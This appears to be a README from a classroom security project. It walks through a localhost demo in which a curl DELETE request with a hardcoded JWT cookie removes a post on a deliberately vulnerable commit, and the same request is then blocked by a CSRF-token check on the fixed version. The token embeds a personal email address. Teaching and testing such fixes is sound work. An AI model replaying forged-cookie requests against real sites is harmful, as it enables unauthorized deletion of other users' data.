how can we execute the malicious program?
general explanation:
Our malicious program will delete a post while using 'git bash' 


follow the following steps:

_____________________Part one - vulnerable site _____________________
1) Run our web in url localhost:3000 --> npm run dev 
2) Execute in VS terminal: 'git checkout 558340b' to navigate to the vulnerable version
3) Open git bash and execute the following command:

curl -X DELETE \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRvbWVyMXcyMDBAZ21haWwuY29tIiwiaWQiOjIwLCJpYXQiOjE2OTEwNzY3NjB9.QgfOP-q0AzKflmE2xc5GwAc7mhHARQLGXX6GA0_TVMs" \
  -d '{"id": 4}' \
  http://localhost:3000/api/post/4

4) Check on the web that post number 4 has been deleted (or any other post)


_____________________Part two - protected site _____________________
1) Terminate the process of node (you might stash the previous changes 
--> 'git stash save "stash changes"')
2) Execute in VS terminal: 'git checkout main' to navigate to the protected version
3) Rerun the web  --> 'npm run dev'
4) Execute the following command in git bash:

curl -X DELETE \
  -H "Content-Type: application/json; charset=utf-8" \
  -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRvbWVyMXcyMDBAZ21haWwuY29tIiwiaWQiOjIwLCJpYXQiOjE2OTEwNzY3NjB9.QgfOP-q0AzKflmE2xc5GwAc7mhHARQLGXX6GA0_TVMs" \
  -d '{"id": 5}' \
  http://localhost:3000/api/post/5	

5) You should see on git bash the following message:  "message":"Invalid CSRF token"
6) Ensure that the post indeed hasn't been deleted
